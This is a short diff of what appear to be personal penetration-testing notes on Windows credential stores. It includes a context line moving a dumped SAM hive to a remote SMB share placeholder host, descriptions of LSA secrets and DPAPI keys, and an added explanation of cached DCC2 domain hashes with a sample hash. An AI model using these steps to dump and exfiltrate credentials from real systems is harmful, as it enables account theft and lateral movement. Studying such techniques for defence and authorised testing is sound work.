@@ -38,4 +38,7 @@ move sam.save \\<hoost ip>\SHARENAME
 		-> Local Security Authority(LSA) secrets, stored under `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets` , accessible only to SYSTEM-privileged processes. 
 			-> **LSA secrets** are just passwords that Windows saves so it can log in on your behalf without you typing them.
 			-> Service acc passes, DPAPI local keys (`dpapi_userkey`, `dpapi_machinekey`), and EFS/encryption keys.
+		-> contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed copies of network credential hashes. An example is:
+			-> `$DCC2$10240#Administrator#4c253e4b65c007a8cd683ea57bc43c76`
+			-> 
 	- `C:\Windows\System32\config\SECURITY `
